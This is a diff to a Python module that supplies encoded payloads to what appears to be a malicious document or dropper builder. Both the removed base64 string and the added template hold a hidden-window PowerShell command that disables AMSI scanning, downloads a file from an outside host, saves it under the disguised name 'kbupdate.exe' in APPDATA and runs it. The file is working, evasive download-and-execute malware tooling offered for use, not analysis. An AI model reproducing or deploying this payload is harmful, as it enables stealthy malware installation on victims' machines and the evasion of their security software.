@@ -1,2 +1,24 @@
-#  payloads for this builder are the entire command to be run, as utf-8, then base64 encoded - e.g. cmd.exe /c powershell.exe -e cG....
-payload_list = ['cG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtbm9wcm9maWxlIFtSZWZdLkFzc2VtYmx5LkdldFR5cGUoJ1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uQW1zaVV0aWxzJykuR2V0RmllbGQoJ2Ftc2lJbml0RmFpbGVkJywnTm9uUHVibGljLFN0YXRpYycpLlNldFZhbHVlKCRudWxsLCR0cnVlKTtJZiAodGVzdC1wYXRoICAkZW52OkFQUERBVEEgKyAnXGtidXBkYXRlLmV4ZScpIHtSZW1vdmUtSXRlbSAgJGVudjpBUFBEQVRBICsgJ1xrYnVwZGF0ZS5leGUnfTsgJE9FS1FEID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudDsgJE9FS1FELkhlYWRlcnNbJ1VzZXItQWdlbnQnXSA9ICdSTEUtVEUnOyAkT0VLUUQuRG93bmxvYWRGaWxlKCdodHRwczovL2N5YmVyc3dlYXQuc2hvcC9MTC91cGRhdGUuY2FiJywgJGVudjpBUFBEQVRBICsgJ1xrYnVwZGF0ZS5leGUnKTsgKE5ldy1PYmplY3QgLWNvbSBTaGVsbC5BcHBsaWNhdGlvbikuU2hlbGxFeGVjdXRlKCRlbnY6QVBQREFUQSArICdca2J1cGRhdGUuZXhlJyk7IFN0b3AtUHJvY2VzcyAtSWQgJFBpZCAtRm9yY2U=']
+import base64
+
+def get_payloads():
+    template = '''powershell.exe -WindowStyle Hidden -noprofile [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);If (test-path  $env:APPDATA + '\localfilename') {Remove-Item  $env:APPDATA + '\localfilename'}; $OEKQD = New-Object System.Net.WebClient; $OEKQD.Headers['User-Agent'] = 'user_agent'; $OEKQD.DownloadFile('my_download_url', $env:APPDATA + '\localfilename'); (New-Object -com Shell.Application).ShellExecute($env:APPDATA + '\localfilename'); Stop-Process -Id $Pid -Force'''
+
+    my_download_url = 'https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe'
+    my_user_agent = 'EMT-KL'
+    my_local_file_name = 'kbupdate.exe'
+
+    payload = template.replace('localfilename', my_local_file_name)
+    payload = payload.replace('my_download_url', my_download_url)
+    payload = payload.replace('user_agent', my_user_agent)
+
+    encoded_payload = base64.b64encode(bytearray(payload, encoding='UTF-8')).decode('UTF-8')
+
+    return [encoded_payload]  # always return a list - limit the list to one entry if you want to choose a specific
+                              # payload instead of a random one
+
+#  run this script directly to see what you will return for payloads
+
+
+if __name__ == '__main__':
+    for i in get_payloads():
+        print(base64.b64decode(i))
